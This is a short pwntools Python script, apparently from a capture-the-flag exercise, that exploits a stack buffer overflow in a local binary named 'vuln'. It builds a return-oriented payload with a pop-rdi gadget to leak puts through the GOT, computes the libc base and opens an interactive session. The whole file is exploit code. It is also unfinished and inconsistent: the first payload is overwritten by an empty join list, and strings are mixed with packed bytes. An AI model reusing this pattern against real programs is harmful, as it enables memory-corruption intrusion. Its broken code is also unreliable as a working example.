from pwn import * 

def pad_null_bytes(value):
    return value + '\x00' * (8-len(value))

elf = ELF("./vuln")
r = elf.process()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi_ret = p64(0x000000000040122b)

payload = "A"*40
payload += pop_rdi_ret
payload += p64(elf.got["puts"])
payload += p64(elf.symbols["puts"])
payload += 50 * "C"


payload = "".join([
	"A"*40,
	pop_rdi_ret,
	





	])


r.sendline(payload)
r.recvuntil("OK\n") # read until OK\n
puts_leak = u64(pad_null_bytes(r.readline())) # null byte padding + unpack to integer(8 byte)
log.info("Puts @ %s" % hex(puts_leak))

libc_base = puts_leak - libc.symbols["puts"] # compute libc base
log.info("libc base @ %s" % hex(libc_base))

r.interactive() # we don't want to close the application
